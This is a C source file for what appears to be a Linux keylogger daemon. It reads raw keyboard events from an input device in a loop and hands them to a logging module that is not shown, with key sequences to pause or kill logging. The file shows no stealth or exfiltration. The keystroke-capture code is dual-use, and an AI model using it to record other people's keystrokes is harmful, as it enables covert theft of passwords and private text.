#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#include "common.h"
#include "input-args.h"
#include "keylog.h"
#include "logger.h"
#include "error.h"

static bool continue_logging = true;

static void start_stop_callback(keylog_t *kl)
{
    if (kl->logging_enabled) {
        logger.info("Key logging enabled");
        kl->pause(kl);
    } else {
        logger.info("Key logging disabled");
        kl->resume(kl);
    }
}

static void kill_callback(keylog_t *kl)
{
    logger.warn("Magic kill switch sequence pressed");

    continue_logging = false;
}

void keyloggerd(cmd_args_t cmd_args)
{
    int keyboard;

    /* Hardcode the input device for now... */
    if ((keyboard = open(cmd_args.keyboard_device, O_RDONLY)) == ERROR) {
        logger.error("Failed to open keyboard device %s: %s",
                     cmd_args.keyboard_device, strerror(errno));
        return;
    }

    /*
     * The sequence of keys to start and stop the key logger
     */
    static unsigned short start_stop_keys[] = {
        KEY_RIGHTSHIFT, KEY_RIGHTSHIFT, KEY_RIGHTSHIFT
    };

    /*
     * The sequence of keys to kill the keylogger daemon
     */
    static unsigned short kill_keys[] = {
        KEY_ESC, KEY_ESC, KEY_ESC
    };

    keyseq_t start_stop_seq = {
        .keys = start_stop_keys,
        .size = ARRAY_SIZE(start_stop_keys),
        .index = 0,
        .callback = start_stop_callback,
    };

    keyseq_t kill_seq = {
        .keys = kill_keys,
        .size = ARRAY_SIZE(kill_keys),
        .index = 0,
        .callback = kill_callback,
    };

    keylog_t *kl;

    kl = create_keylog(cmd_args);

    kl->install_seq(kl, start_stop_seq);
    kl->install_seq(kl, kill_seq);

    kl->open(kl);

    ssize_t n;
    struct input_event event;

    while (continue_logging) {
        n = read(keyboard, &event, sizeof(event));

        if (n > 0) {
            kl->process_event(kl, event);
        } else {
            if (errno == EINTR) {
                continue;
            } else {
                logger.error("Failed to read bytes: %s", strerror(errno));
                break;
            }
        }
    }

    kl->close(kl);

    destroy_keylog(kl);
}
